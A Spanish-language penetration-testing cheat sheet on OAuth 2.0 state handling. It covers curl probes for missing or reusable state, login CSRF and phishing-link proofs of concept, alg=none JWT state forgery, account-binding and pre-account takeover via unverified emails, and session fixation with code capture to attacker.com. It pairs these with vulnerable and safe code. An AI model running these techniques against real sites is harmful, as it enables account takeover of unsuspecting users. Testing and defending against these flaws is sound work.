---
aliases:
  - OAuth State CSRF
  - Login CSRF OAuth
  - Account Binding Attack
  - Pre-Account Takeover
tags:
  - type/technique
  - vuln/oauth
  - vuln/csrf
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[OAuth 2.0 Misconfigurations]]'
  - '[[Cross-Site Request Forgery (CSRF)]]'
---
# OAuth 2.0 - State / CSRF / Login CSRF

***

## State Ausente

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/oauth/authorize?client_id=APP&response_type=code&redirect_uri=https://known.com/cb&scope=email"` (sin `state=`) | Si emite code sin state → CSRF posible | Server no exige state. |
| `curl -sI "https://target/cb?code=AAA"` (sin state param post-callback) | Si server procesa → callback no valida state | Validation absent. |
| Capturar `state=BBB` legit + replay desde otra session: `curl https://target/cb?code=AAA&state=BBB` | Si acepta state cross-session → no bound a session | Reuse sin session bind. |
| `state=anything` en authorize | Si pasa → presence-only validation | Fake validation. |
| Login CSRF PoC: `<img src="https://target/oauth/start?...&state=ATTACKER_STATE">` | Forzar OAuth flow desde víctima's session | Login CSRF clásico. |
^oauth-state-absent

### Test state requirement

```bash
# 1. State requerido en authorize?
curl -sI "https://target/oauth/authorize?client_id=APP&response_type=code&redirect_uri=https://known.com/cb&scope=email" | grep -iE 'location|^HTTP'
# 200/302 emitido sin state → vuln

# 2. Validado en callback?
curl -sI "https://target/cb?code=AAA"  # sin state
# 200 procesado → no validado

# 3. Cross-user state binding
# User1 inicia → captura state_1
# User2 callback con state_1 → si acepta = no bound a session
```

___

## State Predecible o Reusable

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `for i in {1..100}; do curl -s "https://target/oauth/start?u=$i" \| grep -oE 'state=[^"&]+'; done \| sort -u` | Predecir patrón state | State derivado de input/incrementos. |
| Capturar state hoy + replay mañana: `curl https://target/cb?code=AAA&state=$OLD_STATE` | Sin TTL → replay long-term | Server no expira state. |
| `curl https://target/cb?code=AAA&state=csrf_protection` | Hardcoded state aceptado | State estático. |
| `state=$(echo -n "user_id:1:1234567890" \| md5sum \| cut -d' ' -f1)` | State predecible MD5(user_id+ts) | Patrón clásico vulnerable. |
| `state=$(jwt encode --alg none '{"u":1}')` | JWT-encoded state con `alg=none` | Forge state via JWT. |
| Capturar state usado + replay en otro browser session | Replay cross-session | No session bind. |
| Capturar state propio + enviar link con ese state a víctima | Login CSRF clásico | State no bound a víctima. |
^oauth-state-predictable

### Patrones state vulnerable (referencia)

```python
# VULN — predecible
state = hashlib.md5(f"{user.id}{int(time.time())}".encode()).hexdigest()

# VULN — estático
state = "csrf_protection"

# VULN — increment
state = str(get_next_oauth_state_id())

# SAFE — random + session bind + TTL
state = secrets.token_urlsafe(32)
session['oauth_state'] = state
session['oauth_state_created'] = time.time()
```

___

## Account Binding Pre-Takeover

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Iniciar OAuth flow propio en `victim.com` con tu Google → capturar `code` antes de callback | Code atacante listo para usar | Setup pre-attack. |
| `<a href="https://victim.com/oauth/link?code=ATTACKER_CODE">Click here</a>` en phishing | Víctima logged-in clickea → bindea Google atacante a cuenta víctima | Endpoint `/link_oauth` sin state. |
| Post-bind: login a `victim.com` con tu Google | ATO persistente | Backend usa Google ID atacante. |
| Repetir bind con Facebook + GitHub atacante | Multi-provider persistence | Multi-vector. |
| Si bind requiere email match: agregar email víctima como unverified en tu Google | Auto-bind triggered | Email-match logic. |
| Post-bind, cambiar email cuenta a tu own en víctima.com | Persistent + email control | Lock-out víctima. |
^oauth-state-binding

### Backend vulnerable (referencia)

```python
# Flask — VULN
@app.route('/auth/google/callback')
def google_cb():
    code = request.args.get('code')
    google_user = exchange_code_for_user(code)  # = atacante's Google
    current_user.google_id = google_user['sub']  # ← bind sin state, sin re-auth
    db.commit()
    return redirect('/dashboard')

# Atacante PoC: phishing link a /auth/google/callback?code=$ATTACKER_CODE
```

___

## Pre-Account Takeover via Email

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| En tu Google: Settings → Emails → Add `victim@target.com` (sin click verify link) | Email unverified asociado a tu Google | Setup pre-attack. |
| Signup en target con tu Google con email víctima en claim | Server crea cuenta atacante con email víctima | Server no checkea `email_verified`. |
| Esperar víctima signup directo → "Email already exists" | Confusion → víctima usa "Sign in with Google" | Cae en cuenta atacante. |
| Post-pretakeover: cambiar password de la cuenta target a uno conocido | Persistent control | Atacante mantiene Google + password. |
| `curl https://target/api/signup -d '{"email":"victim@target.com","email_verified":true,"google_id":"..."}'` (si signup endpoint vulnerable) | Direct API pre-takeover | Mass Assignment + email_verified inject. |
^oauth-state-pretakeover

### Defense check (referencia)

```python
# VULN
def signup_oauth(google_token):
    user_info = decode(google_token)
    User.create(email=user_info['email'])  # acepta sin verificar

# SAFE
def signup_oauth(google_token):
    user_info = decode(google_token)
    if not user_info.get('email_verified'):
        abort(400, 'email not verified')
    if user_info.get('iss') != EXPECTED_ISSUER:
        abort(400, 'invalid issuer')
```

___

## Session Fixation via OAuth

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl "https://target/oauth/start?prompt=none&...&redirect_uri=...&state=ATTACKER_STATE"` | Silent login si víctima already auth en IdP | `prompt=none` aceptado. |
| Capturar URL Google con `state=ATTACKER_STATE` + enviar a víctima | Víctima callback usa atacante's state | State no bound a víctima session. |
| Pre-set session cookie atacante en víctima browser via XSS / subdomain takeover + iniciar OAuth flow | Víctima atrapada en sesión atacante | Combine con XSS. |
| `display=popup` + listener postMessage en attacker.com | Captura code via window.opener | Popup-based flow vulnerable. |
| Post-fixation: monitorear cuenta "atacante" para ver actividad víctima | Data exfil silent | Persistent watch. |
^oauth-state-fixation

***
